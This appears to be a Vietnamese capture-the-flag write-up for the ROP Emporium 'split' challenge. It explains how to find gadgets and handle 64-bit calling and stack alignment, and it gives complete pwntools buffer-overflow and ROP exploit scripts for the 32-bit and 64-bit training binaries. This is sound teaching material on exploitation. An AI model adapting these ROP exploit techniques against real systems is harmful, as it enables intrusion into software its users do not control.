# split - challenge 2

[binary file and my exploit code](https://github.com/Hjn4Pwn/Pwn/tree/main/ROP/chall2_split)

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall2_split$ file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=98755e64e1d0c1bff48fccae1dca9ee9e3c609e2, not stripped
```

```python
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall2_split$ rabin2 -z split
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

Ở đây thì ta đã thấy được chuỗi quan trọng là */bin/cat flag.txt* chúng ta có thể lợi dụng nó để in ra flag.

### usefulFunction

```python
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
End of assembler dump.
```
Ta phân tích kĩ chỗ này 1 xíu bởi vì ở chall 32-bit thì có tí khác biệt. Ta thấy là trước lệnh call là **mov** giá trị vào **edi** hay **rdi** . Tức là trong kiến trúc 64-bit thì các tham số được đưa vào registers.

Trong khi đó ở kiến trúc 32-bit thay vì **mov** như trên thì nó lại là push tức là tham số lấy vào từ stack.
Do đó với kiến trúc 32-bit ta có : ***ROP chain = offset_padding + system_addr + bin_cat_command***

Còn 64-bit cho trường hợp hiện tại thì:

| Syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
|---------|------|------|------|------|------|------|
|  %rax   | %rdi | %rsi | %rdx | %rcx | %r8  | %r9  |

Nên là ta cần phải đưa địa chỉ lưu chuỗi */bin/cat flag.txt* đã nói ở trên vào thanh ghi **rdi** 

Bây giờ ta cần gadget có thể làm điều đó:

```c#
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/ROP/chall2_split$ ROPgadget --binary split | grep "pop rdi ; ret"
0x00000000004007c3 : pop rdi ; ret
```
Tuy nhiên vì đây là kiến trúc 64-bit: 
> The MOVAPS issue
>
>> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

nên ta cần thêm gadget **ret** :
```shell
ROPgadget --binary split | grep "ret"
```
ta có được
```python
0x000000000040053e : ret
```

### Exploit:

#### 32-bit 
```python
from pwn import *
r = process("./split32")
#gdb.attach(r, api= True)

binsh = 0x0804a030
sys = 0x0804861a
ret =0x0804837e

payload = b'A'*44  + p32(sys) + p32(binsh)

r.sendline(payload)
r.interactive()
```
#### 64-bit
```python
from pwn import *
r = process("./split")

binsh = 0x00601060
sys = 0x0000000000400560 #do la mov chu khong push, neu push => nhay den dia chi stack
pop_rdi_ret = 0x00000000004007c3
ret = 0x000000000040053e

payload = b'A'*40 + p64(ret) + p64(pop_rdi_ret)  + p64(binsh) + p64(sys)

r.sendline(payload)
r.interactive()
```